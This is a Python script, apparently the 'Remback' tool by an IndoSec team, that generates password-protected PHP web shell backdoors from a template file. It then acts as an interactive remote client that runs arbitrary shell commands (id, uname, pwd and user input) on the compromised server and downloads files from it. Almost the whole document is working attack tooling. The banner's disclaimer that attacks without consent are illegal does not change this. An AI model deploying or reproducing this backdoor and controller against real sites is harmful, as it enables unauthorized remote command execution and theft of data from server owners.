# -*- coding: utf-8 -*-
from requests import get
from time import sleep
import os
import re

def cls():
    os.system('cls' if os.name=='nt' else 'clear')
     
def banner():
    print("""
         `:+syhhys+:`           ______ _______ _______  _____  _______ _______
       -yNMMMMMMMMMMMh:        |_____/ |______ |  |  | |     |    |    |______
      /MMMMMMMMMMMMMMMM+       |    \_ |______ |  |  | |_____|    |    |______
      NhMMMMMMMMMMMMMMyN`     
      m+NMMMMMMMMMMMMM/N       ______  _______ _______ _     _ ______   _____   _____   ______
      :omy+/:+MM+:/+yN+/       |_____] |_____| |       |____/  |     \ |     | |     | |_____/
  :-   -M-  `/NN/`  :M.   --   |_____] |     | |_____  |    \_ |_____/ |_____| |_____| |    \_
 .mN.  :NNysmM++NmssNN-  .Nm.  ---------------------------------------------------------------
.yyhyys///+yMd+odMh+///syhhyy. Author : Rizsyad AR ft Fauzan W
 `  `.-+s-o/syyyys/s:s+:.`  `  Team   : { IndoSec }
          s-      :y           We not responsible for damage caused by Remback. 
  `/:-/ohy+mhyssyhm+sho/-:/`   Attacking targets without mutual consent is illegal!
   +mNy+-` ./osso/. `-+yNm+   
    s/                  +s    
    """)

def fiturcd(cmd, getdir):
    getcmd = re.match(r'cd (.*)', cmd, re.M|re.I)
    newdir1 = ""

    if getcmd:
        if getcmd.group(1) == "..":
            for i in getdir.split('/')[:-1]:
                newdir1 += i + "/"
        
            result = newdir1

            return result
            
        else:
            for i in getdir.split('/'):
                newdir1 += i + "/" 
            
            result = newdir1 + getcmd.group(1)

            return result
    else:
        return False
        
def fiturdownload(cmd, getdir):
    getfile = re.match(r'download (.*)', cmd, re.M|re.I)
    
    if getfile:
        result = getdir + "/" + getfile.group(1)
        
        return result
        
        #
    else:
        return False

    
def connect():
    url = raw_input("[?] Input Backdoor Location\t: ")
    password = raw_input("[?] Input Backdoor Password\t: ")

    try:
        check = get(url, params={"password":password}).text.replace('\n','')
    except:
        print("[-] Error, Check your URL")
        exit(0)

    if check == "true":
    
        userID = get(url, params={"password":password,"cmd":"id"}).text.replace('\n','')
        kernel = get(url, params={"password":password,"cmd":"uname -nvpmso"}).text.replace('\n','')
        getdir = get(url, params={"password":password,"cmd":"pwd"}).text.replace('\n','')
        sleep(2)
        print("[!] Backdoor Is Live.. Waiting to Connect BackDoor\n")
        sleep(2)


        command = "Remback@shell:" +getdir + "# "
        result = ""
        
        while True:
                cmd = raw_input(command)

                if cmd == "exit":
                    break
                elif cmd == "clear":
                    cls()
                elif cmd == "info":
                    result = get(url, params={"password":password,"dir":getdir,"aksi":"info","cmd":""}).text
                    print(result)


                if(fiturcd(cmd, getdir) != False):
                    output = fiturcd(cmd, getdir)
                    getdir = get(url, params={"password":password,"dir":output,"cmd":"pwd"}).text.replace('\n','')
                    result = get(url, params={"password":password,"dir":getdir,"cmd":cmd}).text
                    command = "Remback@shell:" +getdir + "# "
                elif(fiturdownload(cmd, getdir) != False):
                    getname = re.match(r'download (.*)', cmd, re.M|re.I)
                    output = fiturdownload(cmd, getdir)
                    savein = raw_input("[?] Save File in: ")      
                    download = get(url, params={"password":password,"dir":getdir,"cmd":"echo ''","aksi":"download","file":output})       
                    open(savein + "/" + getname.group(1), 'wb').write(download.content)
                else:
                    result = get(url, params={"password":password,"dir":getdir,"cmd":cmd}).text

                print(result + "\n")         
    
    else:
        print("[-] Password is Incoret")
        exit(0)


def generate():
    backdoor_name   = raw_input("\n[?] Backdoor Name : ")
    password        = raw_input("[?] Password      : ")
    opensample      = open('sample/backdoor.txt', 'r')
    replacePassword = opensample.read().replace('12345p455word', password)
    opensample.close()
    openbackdoor    = open(backdoor_name + '.php', 'w')
    openbackdoor.write(replacePassword)
    openbackdoor.close()
    print("""\n[✔] Generating backdoor successfully\n└[•] Backdoor Name\t: """ + backdoor_name + """\n└[•] Backdoor Password\t: """ + password +"""""")

banner()
print("""
[+] Options :
└[•] 1. Generate Backdoor
└[•] 2. Remote Backdoor
└[•] 3. Bypass Shell Exec (Coming Soon)
""")
action = raw_input("┌[+] Choose the options\n└[remback@indosec]:~# ")
if action == "1":
    generate()
elif action == "2":
    connect()
else:
    print("[!] Incorrect options")

